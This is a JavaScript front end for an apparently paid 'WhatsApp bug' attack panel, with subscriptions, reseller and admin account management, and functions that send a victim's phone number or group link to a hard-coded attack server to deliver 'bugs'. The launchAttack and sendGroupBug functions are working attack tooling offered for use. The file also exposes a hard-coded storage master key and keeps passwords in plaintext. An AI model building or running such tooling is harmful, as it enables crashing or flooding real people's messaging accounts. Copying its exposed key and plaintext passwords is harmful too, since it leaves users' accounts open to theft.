/* ========== CONFIGURATION CONSTANTS ========== */
const BIN_ID = "688384cdae596e708fbb97e4";
const API_KEY = "$2a$10$55IAjRl7i3QlilxdTPmqx.5/Idiemz453V9zHKc76Z9q4jDPhvL.C";
const headers = {
  "Content-Type": "application/json",
  "X-Master-Key": API_KEY
};

const API_CONFIG = {
  STATUS_URL: "http://178.128.24.51:2001/status",
  ATTACK_URL: "http://178.128.24.51:2001/UltraXwebAPI",
  MAX_REQUESTS_PER_MINUTE: 5,
  REQUEST_TIMEOUT: 5000
};

const SESSION_CONFIG = {
  TIMEOUT: 1800, // 30 minutes in seconds
  WARNING_TIME: 300 // 5 minutes before timeout
};

const VALIDATION_PATTERNS = {
  PHONE: /^[0-9]{10,15}$/,
  WHATSAPP_GROUP: /^https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9_-]+$/,
  USERNAME: /^[a-zA-Z0-9_]{3,20}$/
};

/* ========== GLOBAL VARIABLES ========== */
let currentUser = null;
let localDeviceId = localStorage.getItem('device_id') || generateDeviceId();
localStorage.setItem('device_id', localDeviceId);

let requestCount = 0;
let lastRequestTimestamp = 0;
let inactivityTimer;

/* ========== DOM ELEMENTS ========== */
const header = document.getElementById('header');
const hamburger = document.getElementById('hamburger');
const sideMenu = document.getElementById('sideMenu');
const menuOverlay = document.getElementById('menuOverlay');
const loginCard = document.getElementById('loginCard');
const dashboard = document.getElementById('dashboard');

/* ========== INITIALIZATION ========== */
document.addEventListener('DOMContentLoaded', () => {
  // Check if user is already logged in
  const user = JSON.parse(localStorage.getItem('currentUser'));
  if (user) {
    currentUser = user;
    showDashboard();
  }

  // Hamburger menu click event
  hamburger.addEventListener('click', toggleMenu);
  menuOverlay.addEventListener('click', toggleMenu);
  
  // Check API connection status
  checkApiConnection();
});

/* ========== UTILITY FUNCTIONS ========== */
function generateDeviceId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}

function validateInput(input, type) {
  switch(type) {
    case 'phone': return VALIDATION_PATTERNS.PHONE.test(input);
    case 'whatsapp': return VALIDATION_PATTERNS.WHATSAPP_GROUP.test(input);
    case 'username': return VALIDATION_PATTERNS.USERNAME.test(input);
    default: return false;
  }
}

function showNotification(message, type = 'success') {
  const notification = document.createElement('div');
  notification.className = `notification notification-${type}`;
  notification.innerHTML = `
    <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-times-circle' : 'fa-exclamation-circle'}"></i>
    ${message}
  `;
  
  document.body.appendChild(notification);
  
  setTimeout(() => notification.style.opacity = '1', 100);
  setTimeout(() => {
    notification.style.opacity = '0';
    setTimeout(() => notification.remove(), 300);
  }, 5000);
}

/* ========== ORIGINAL FUNCTIONS (PRESERVED) ========== */
function toggleTargetField() {
  const targetType = document.getElementById('targetType').value;
  document.getElementById('phoneNumberGroup').classList.toggle('hidden', targetType !== 'phone');
  document.getElementById('whatsappGroup').classList.toggle('hidden', targetType !== 'whatsapp');
}

// Original togglePassword function (preserved exactly)
function togglePassword(inputId) {
  const input = document.getElementById(inputId);
  const icon = input.nextElementSibling.querySelector('i');
  
  if (input.type === 'password') {
    input.type = 'text';
    icon.classList.replace('fa-eye', 'fa-eye-slash');
  } else {
    input.type = 'password';
    icon.classList.replace('fa-eye-slash', 'fa-eye');
  }
}

function toggleMenu() {
  sideMenu.classList.toggle('active');
  menuOverlay.classList.toggle('active');
}

function hideAllMenus() {
  document.querySelectorAll('.card').forEach(card => {
    if (!card.id.includes('loginCard') && !card.id.includes('dashboard')) {
      card.classList.add('hidden');
    }
  });
  toggleMenu();
}

function showMenu(menuId) {
  hideAllMenus();
  document.getElementById(menuId).classList.remove('hidden');
  
  if (menuId === 'adminListUsers') {
    loadUserList();
  }
}

function showError(element, message) {
  element.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
  element.style.color = '#f44336';
}

function showSuccess(element, message) {
  element.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
  element.style.color = 'var(--main)';
}

function setButtonLoading(button, isLoading) {
  button.innerHTML = isLoading 
    ? '<i class="fas fa-spinner fa-spin"></i> Processing...' 
    : '<i class="fas fa-sign-in-alt"></i> Login';
  button.disabled = isLoading;
}

/* ========== SESSION MANAGEMENT ========== */
function startInactivityTimer() {
  resetInactivityTimer();
  ['click', 'mousemove', 'keypress'].forEach(event => {
    document.addEventListener(event, resetInactivityTimer);
  });
}

function resetInactivityTimer() {
  clearTimeout(inactivityTimer);
  inactivityTimer = setTimeout(() => {
    showNotification('You have been logged out due to inactivity', 'warning');
    logout();
  }, SESSION_CONFIG.TIMEOUT * 1000);
  
  setTimeout(() => {
    if (currentUser) showNotification('You will be logged out in 5 minutes', 'warning');
  }, (SESSION_CONFIG.TIMEOUT - SESSION_CONFIG.WARNING_TIME) * 1000);
}

/* ========== API FUNCTIONS ========== */
async function checkApiConnection() {
  const statusElement = document.getElementById('apiStatus');
  
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), API_CONFIG.REQUEST_TIMEOUT);

    const response = await fetch(API_CONFIG.STATUS_URL, { signal: controller.signal });

    clearTimeout(timeoutId);
    
    const data = await response.json();
    const isConnected = data.status === 'connected';

    if (statusElement) {
      statusElement.className = isConnected ? 'status-connected' : 'status-disconnected';
      statusElement.innerHTML = `<i class="fas fa-${isConnected ? 'check' : 'times'}-circle"></i> ${isConnected ? 'Connected' : 'Disconnected'}`;
    }

    return isConnected;
  } catch (error) {
    console.error('API connection check failed:', error);
    if (statusElement) {
      statusElement.className = 'status-disconnected';
      statusElement.innerHTML = '<i class="fas fa-times-circle"></i> Connection Failed';
    }
    return false;
  }
}

async function getUsers() {
  try {
    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
    const data = await response.json();
    return data.record;
  } catch (error) {
    console.error('Error fetching users:', error);
    return [];
  }
}

async function updateUsers(users) {
  try {
    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
      method: 'PUT',
      headers,
      body: JSON.stringify(users)
    });
    return await response.json();
  } catch (error) {
    console.error('Error updating users:', error);
    return null;
  }
}

/* ========== AUTH FUNCTIONS ========== */
async function login() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  const loginResult = document.getElementById('loginResult');
  const loginBtn = document.getElementById('loginBtn');

  loginResult.innerHTML = '';
  loginResult.style.color = '';

  if (!username || !password) {
    showError(loginResult, 'Please enter both username and password');
    return;
  }

  setButtonLoading(loginBtn, true);

  try {
    const users = await getUsers();
    const user = users.find(u => u.username === username && u.password === password);

    if (!user) {
      showError(loginResult, 'Invalid username or password');
      return;
    }

    if (user.device_id && user.device_id !== localDeviceId) {
      showError(loginResult, `Account is active on another device (ID: ${user.device_id})`);
      return;
    }

    if (user.role !== 'admin' && user.expired) {
      const today = new Date();
      const expiryDate = new Date(user.expired);
      if (expiryDate < today) {
        showError(loginResult, `Account expired on ${user.expired}. Please renew.`);
        return;
      }
    }

    const updatedUser = { ...user, device_id: localDeviceId };
    const updatedUsers = users.map(u => u.username === username ? updatedUser : u);
    await updateUsers(updatedUsers);

    currentUser = updatedUser;
    localStorage.setItem('currentUser', JSON.stringify(updatedUser));
    
    showSuccess(loginResult, `Welcome back, ${username}!`);
    setTimeout(showDashboard, 1000);

  } catch (error) {
    console.error('Login error:', error);
    showError(loginResult, `System error: ${error.message || 'Please try again later'}`);
  } finally {
    setButtonLoading(loginBtn, false);
  }
}

async function logout() {
  try {
    if (currentUser) {
      const users = await getUsers();
      const updatedUsers = users.map(u => {
        if (u.username === currentUser.username) {
          return { ...u, device_id: '' };
        }
        return u;
      });
      await updateUsers(updatedUsers);
    }
  } catch (error) {
    console.error('Error during logout:', error);
  } finally {
    currentUser = null;
    localStorage.removeItem('currentUser');
    header.classList.add('hidden');
    loginCard.classList.remove('hidden');
    dashboard.classList.add('hidden');
    hideAllMenus();
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
  }
}

/* ========== USER MANAGEMENT ========== */
async function resetPassword() {
  const newPassword = document.getElementById('newPassword').value;
  const resetPassBtn = document.getElementById('resetPassBtn');
  const myInfoResult = document.getElementById('myInfoResult');

  if (!newPassword) {
    myInfoResult.innerHTML = 'Please enter new password';
    myInfoResult.style.color = '#f44336';
    return;
  }

  resetPassBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Updating...';
  resetPassBtn.disabled = true;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => {
      if (u.username === currentUser.username) {
        return { ...u, password: newPassword };
      }
      return u;
    });

    await updateUsers(updatedUsers);

    currentUser.password = newPassword;
    localStorage.setItem('currentUser', JSON.stringify(currentUser));

    myInfoResult.innerHTML = 'Password updated successfully';
    myInfoResult.style.color = 'var(--main)';
    document.getElementById('newPassword').value = '';
  } catch (error) {
    myInfoResult.innerHTML = 'Error updating password: ' + error.message;
    myInfoResult.style.color = '#f44336';
  } finally {
    resetPassBtn.innerHTML = '<i class="fas fa-key"></i> Reset Password';
    resetPassBtn.disabled = false;
  }
}

/* ========== ATTACK FUNCTIONS ========== */
async function launchAttack() {
  const now = Date.now();
  if (now - lastRequestTimestamp > 60000) {
    requestCount = 0;
    lastRequestTimestamp = now;
  }
  
  if (requestCount >= API_CONFIG.MAX_REQUESTS_PER_MINUTE) {
    showNotification('Too many requests. Please wait before trying again.', 'error');
    return;
  }
  
  const targetNumber = document.getElementById('targetNumber').value.trim();
  if (!validateInput(targetNumber, 'phone')) {
    showNotification('Invalid phone number format (10-15 digits required)', 'error');
    return;
  }
  
  const bugType = document.getElementById('bugType').value;
  const attackBtn = document.getElementById('attackBtn');
  const attackResult = document.getElementById('attackResult');

  attackBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Attacking...';
  attackBtn.disabled = true;

  try {
    const isConnected = await checkApiConnection();
    if (!isConnected) {
      showNotification('API is currently unavailable', 'error');
      return;
    }

    const response = await fetch(`${API_CONFIG.ATTACK_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}`);
    
    if (!response.ok) throw new Error("Failed to connect to attack server");

    const result = await response.json();
    
    if (result.success) {
      showNotification('Attack launched successfully!', 'success');
      attackResult.innerHTML = `Attack launched successfully against ${targetNumber}`;
      attackResult.style.color = 'var(--main)';
    } else {
      showNotification(result.message || 'Attack failed', 'error');
      attackResult.innerHTML = result.message || 'Attack failed';
      attackResult.style.color = '#f44336';
    }
  } catch (error) {
    showNotification('Attack failed: ' + error.message, 'error');
    attackResult.innerHTML = 'Attack failed: ' + error.message;
    attackResult.style.color = '#f44336';
  } finally {
    attackBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
    attackBtn.disabled = false;
    requestCount++;
  }
}

async function sendGroupBug() {
  const groupLink = document.getElementById('whatsappGroup').value.trim();
  const bugType = document.getElementById('whatsappBugType').value;
  const attackBtn = document.getElementById('whatsappAttackBtn');
  const resultElement = document.getElementById('attackResult');

  if (!validateInput(groupLink, 'whatsapp')) {
    showNotification('Invalid WhatsApp group link format', 'error');
    return;
  }

  attackBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
  attackBtn.disabled = true;

  try {
    const isConnected = await checkApiConnection();
    if (!isConnected) {
      showNotification('API is currently unavailable', 'error');
      return;
    }

    const response = await fetch(`${API_CONFIG.ATTACK_URL}?groupLink=${encodeURIComponent(groupLink)}&type=${bugType}`);
    
    if (!response.ok) throw new Error(await response.text() || "Failed to connect to server");

    const result = await response.json();
    if (result.success) {
      showNotification('Bug successfully sent to WhatsApp group!', 'success');
      resultElement.innerHTML = `Bug sent to group: ${groupLink}`;
      resultElement.style.color = 'var(--main)';
    } else {
      showNotification(result.message || 'Failed to send bug', 'error');
      resultElement.innerHTML = result.message || 'Failed to send bug';
      resultElement.style.color = '#f44336';
    }
  } catch (error) {
    showNotification(`Error: ${error.message}`, 'error');
    resultElement.innerHTML = `Error: ${error.message}`;
    resultElement.style.color = '#f44336';
  } finally {
    attackBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Group Bug';
    attackBtn.disabled = false;
  }
}

/* ========== ADMIN FUNCTIONS ========== */
async function createUser() {
  const username = document.getElementById('newUsername').value;
  const password = document.getElementById('newUserPassword').value;
  const role = document.getElementById('newUserRole').value;
  const days = parseInt(document.getElementById('newUserDays').value);
  const createUserBtn = document.getElementById('createUserBtn');
  const createUserResult = document.getElementById('createUserResult');

  if (!username || !password || isNaN(days)) {
    createUserResult.innerHTML = 'Please fill all fields correctly';
    createUserResult.style.color = '#f44336';
    return;
  }

  if (currentUser.role === 'reseller' && (role !== 'user' || days > 30)) {
    createUserResult.innerHTML = 'Resellers can only create user accounts with max 30 days';
    createUserResult.style.color = '#f44336';
    return;
  }

  createUserBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Creating...';
  createUserBtn.disabled = true;

  try {
    const users = await getUsers();
    
    if (users.some(u => u.username === username)) {
      createUserResult.innerHTML = 'Username already exists';
      createUserResult.style.color = '#f44336';
      return;
    }

    const expiredDate = new Date();
    expiredDate.setDate(expiredDate.getDate() + days);

    const newUser = {
      username,
      password,
      role,
      telegram_id: null,
      device_id: '',
      expired: expiredDate.toISOString().split('T')[0]
    };

    const updatedUsers = [...users, newUser];
    await updateUsers(updatedUsers);

    createUserResult.innerHTML = `User ${username} created successfully`;
    createUserResult.style.color = 'var(--main)';
    
    document.getElementById('newUsername').value = '';
    document.getElementById('newUserPassword').value = '';
    document.getElementById('newUserDays').value = '30';
  } catch (error) {
    createUserResult.innerHTML = 'Error creating user: ' + error.message;
    createUserResult.style.color = '#f44336';
  } finally {
    createUserBtn.innerHTML = '<i class="fas fa-save"></i> Create User';
    createUserBtn.disabled = false;
  }
}

async function deleteUser(username) {
  if (!confirm(`Are you sure you want to delete user ${username}?`)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.filter(u => u.username !== username);
    await updateUsers(updatedUsers);
    
    if (currentUser.username === username) {
      logout();
    } else {
      loadUserList();
    }
  } catch (error) {
    console.error('Error deleting user:', error);
    alert('Failed to delete user');
  }
}

async function addDaysToUser(username) {
  const days = prompt('Enter number of days to add:', '30');
  if (!days || isNaN(days)) return;

  try {
    const users = await getUsers();
    const user = users.find(u => u.username === username);
    if (!user) return;

    const expiredDate = new Date(user.expired || new Date());
    expiredDate.setDate(expiredDate.getDate() + parseInt(days));

    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, expired: expiredDate.toISOString().split('T')[0] } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    alert(`Added ${days} days to ${username}`);
  } catch (error) {
    console.error('Error adding days:', error);
    alert('Failed to add days');
  }
}

async function changeUserRole(username) {
  const role = prompt('Enter new role (admin/reseller/user):', 'user');
  if (!role || !['admin', 'reseller', 'user'].includes(role)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, role } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    alert(`Changed role for ${username} to ${role}`);
  } catch (error) {
    console.error('Error changing role:', error);
    alert('Failed to change role');
  }
}

async function changeUsername(oldUsername) {
  const newUsername = prompt('Enter new username:', oldUsername);
  if (!newUsername || newUsername === oldUsername) return;

  try {
    const users = await getUsers();
    if (users.some(u => u.username === newUsername)) {
      alert('Username already exists');
      return;
    }

    const updatedUsers = users.map(u => 
      u.username === oldUsername ? { ...u, username: newUsername } : u
    );

    await updateUsers(updatedUsers);
    
    if (currentUser.username === oldUsername) {
      currentUser.username = newUsername;
      localStorage.setItem('currentUser', JSON.stringify(currentUser));
      document.getElementById('infoUsername').textContent = newUsername;
    }
    
    loadUserList();
    alert(`Username changed from ${oldUsername} to ${newUsername}`);
  } catch (error) {
    console.error('Error changing username:', error);
    alert('Failed to change username');
  }
}

async function changeUserPassword(username) {
  const newPassword = prompt('Enter new password:');
  if (!newPassword) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, password: newPassword } : u
    );

    await updateUsers(updatedUsers);
    alert(`Password changed for ${username}`);
  } catch (error) {
    console.error('Error changing password:', error);
    alert('Failed to change password');
  }
}

async function resetDeviceId(username) {
  if (!confirm(`Reset device ID for ${username}? This will log them out.`)) return;

  try {
    const users = await getUsers();
    const updatedUsers = users.map(u => 
      u.username === username ? { ...u, device_id: '' } : u
    );

    await updateUsers(updatedUsers);
    loadUserList();
    alert(`Device ID reset for ${username}`);
  } catch (error) {
    console.error('Error resetting device ID:', error);
    alert('Failed to reset device ID');
  }
}

/* ========== USER LIST MANAGEMENT ========== */
async function loadUserList() {
  const userListBody = document.getElementById('userListBody');
  userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">Loading users...</td></tr>';

  try {
    const users = await getUsers();
    
    if (users.length === 0) {
      userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">No users found</td></tr>';
      return;
    }

    userListBody.innerHTML = '';
    users.forEach(user => {
      const row = document.createElement('tr');
      
      let actions = '';
      if (currentUser.role === 'admin' && user.username !== currentUser.username) {
        actions = `
          <div class="action-menu">
            <button class="action-btn">
              <i class="fas fa-cog"></i>
            </button>
            <div class="action-menu-content">
              <a href="#" onclick="addDaysToUser('${user.username}'); return false;">
                <i class="fas fa-calendar-plus"></i> Add Days
              </a>
              <a href="#" onclick="changeUserRole('${user.username}'); return false;">
                <i class="fas fa-user-tag"></i> Change Role
              </a>
              <a href="#" onclick="changeUsername('${user.username}'); return false;">
                <i class="fas fa-user-edit"></i> Change Username
              </a>
              <a href="#" onclick="changeUserPassword('${user.username}'); return false;">
                <i class="fas fa-key"></i> Change Password
              </a>
              <a href="#" onclick="resetDeviceId('${user.username}'); return false;">
                <i class="fas fa-mobile-alt"></i> Reset Device ID
              </a>
              <a href="#" onclick="deleteUser('${user.username}'); return false;" style="color: #f44336;">
                <i class="fas fa-trash"></i> Delete User
              </a>
            </div>
          </div>
        `;
      }
      
      row.innerHTML = `
        <td>${user.username}</td>
        <td>${user.role}</td>
        <td>${user.expired || 'N/A'}</td>
        <td>${user.device_id || 'Not logged in'}</td>
        <td>${actions}</td>
      `;
      userListBody.appendChild(row);
    });
  } catch (error) {
    userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center; color: #f44336;">Error loading users</td></tr>';
  }
}

/* ========== ATTACK MENU FUNCTIONS ========== */
function switchAttackTab(tabName) {
  document.querySelectorAll('.tab-btn').forEach(btn => {
    btn.classList.toggle('active', btn.textContent.toLowerCase().includes(tabName));
  });
  
  document.getElementById('numberTarget').classList.toggle('hidden', tabName !== 'number');
  document.getElementById('whatsappTarget').classList.toggle('hidden', tabName !== 'whatsapp');
  document.getElementById('attackResult').innerHTML = '';
}

function switchAttackType(type) {
  const phoneSection = document.getElementById('phoneAttackSection');
  const whatsappSection = document.getElementById('whatsappAttackSection');
  
  if (type === 'phone') {
    phoneSection.classList.remove('hidden');
    whatsappSection.classList.add('hidden');
  } else {
    phoneSection.classList.add('hidden');
    whatsappSection.classList.remove('hidden');
  }
  
  document.getElementById('attackResult').innerHTML = '';
  checkApiConnection();
}

/* ========== DASHBOARD FUNCTIONS ========== */
function showDashboard() {
  header.classList.remove('hidden');
  loginCard.classList.add('hidden');
  dashboard.classList.remove('hidden');
  
  document.getElementById('infoUsername').textContent = currentUser.username;
  document.getElementById('infoRole').textContent = currentUser.role;
  document.getElementById('infoDeviceId').textContent = localDeviceId;
  document.getElementById('infoExpired').textContent = currentUser.expired || 'N/A';
  
  updateSideMenu();
  startInactivityTimer();
}

function updateSideMenu() {
  sideMenu.innerHTML = '';
  
  if (!currentUser) return;

  const menuItems = [
    { icon: 'fa-user', text: 'My Info', action: () => showMenu('myInfo') },
    { icon: 'fa-bug', text: 'Attack Menu', action: () => showMenu('attackMenu') }
  ];

  if (currentUser.role === 'admin') {
    menuItems.push(
      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') },
      { icon: 'fa-users', text: 'List Users', action: () => showMenu('adminListUsers') }
    );
  } else if (currentUser.role === 'reseller') {
    menuItems.push(
      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') }
    );
  }

  const statusItem = document.createElement('div');
  statusItem.className = 'menu-item';
  statusItem.innerHTML = '<i class="fas fa-plug"></i> <span id="apiStatus">Checking API...</span>';
  sideMenu.appendChild(statusItem);

  menuItems.forEach(item => {
    const menuItem = document.createElement('div');
    menuItem.className = 'menu-item';
    menuItem.innerHTML = `<i class="fas ${item.icon}"></i> ${item.text}`;
    menuItem.addEventListener('click', item.action);
    sideMenu.appendChild(menuItem);
  });

  const logoutItem = document.createElement('div');
  logoutItem.className = 'menu-item';
  logoutItem.innerHTML = '<i class="fas fa-sign-out-alt"></i> Logout';
  logoutItem.addEventListener('click', logout);
  logoutItem.style.marginTop = '20px';
  logoutItem.style.color = '#f44336';
  sideMenu.appendChild(logoutItem);
}